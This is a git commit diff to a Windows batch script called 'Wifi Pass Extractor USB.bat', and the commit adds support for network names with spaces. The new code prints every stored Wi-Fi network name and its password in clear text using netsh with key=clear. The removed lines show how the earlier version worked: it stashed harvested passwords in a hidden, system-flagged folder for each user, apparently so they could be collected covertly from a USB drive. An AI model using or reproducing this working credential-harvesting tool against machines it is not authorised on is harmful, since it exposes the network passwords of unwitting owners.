c2c7bf11126642a125655d85bffb85df408dfd8d
infosecZombie <69755943+infosecZombie@users.noreply.github.com>
2023-08-19 07:14:15 +0500

    Updated version (supports spaces in Wifi Name)
    Supports 5 spaces in wifi Name, in old batch file it wasn't extracting the wifi names with spaces.

--- WIFI Password Extractor/Wifi Pass Extractor USB.bat
+++ WIFI Password Extractor/Wifi Pass Extractor USB.bat
@@ -1,23 +1,41 @@
-
-:::: Run as Admin, This Batch file extracts the wifi passwords in clear text :::::: 
+::::: This Batch file extracts the wifi passwords in clear text even the ssid has spaces in it (maximum 7 words and 6 spaces) :::::: 
 
 @echo off
+setlocal enabledelayedexpansion
 
-:::::: 1. Creating Main Hidden Directory ::::::
 
-if NOT EXIST system-info (
-md system-info
-attrib +h +s system-info
-cd system-info
-) ELSE (
-cd system-info
+for /f "skip=9 tokens=1,2,3,4,5,6,7,8,9,10 delims=: " %%a in ('netsh wlan show profiles') do ( 
+  set d=%%d
+  set e=%%e
+  set f=%%f
+  set g=%%g
+  set h=%%h
+  set i=%%i
+  set j=%%j
+
+  if defined d (
+   set ssid=!d!
+  )
+  if defined e (
+   set ssid=!ssid! !e!
+  )
+  if defined f (
+   set ssid=!ssid! !f!
+  )
+  if defined g (
+   set ssid=!ssid! !g!
+  )
+  if defined h (
+   set ssid=!ssid! !h!
+  )
+  if defined i (
+   set ssid=!ssid! !i!
+  )
+  if defined j (
+   set ssid=!ssid! !j!
+  )
+
+REM @echo !ssid!
+@netsh wlan show profile name="!ssid!" key=clear | findstr /c:"SSID name" /c:"Key Content" && echo.
 )
-
-:::::: 2. Creating Directory for user ::::::
-set user=%USERDOMAIN%_%USERNAME%
-md %user%
-cd %user%
-
-:::::: 3. Extracting Wifi Passwords to file ::::::
-for /f "skip=9 tokens=1-4* delims= " %%a in ('netsh wlan show profiles') do @netsh wlan show profile name="%%e" key=clear | findstr /c:"SSID name" /c:"Key Content" >> wifi.txt && echo. >> wifi.txt
-
+endlocal
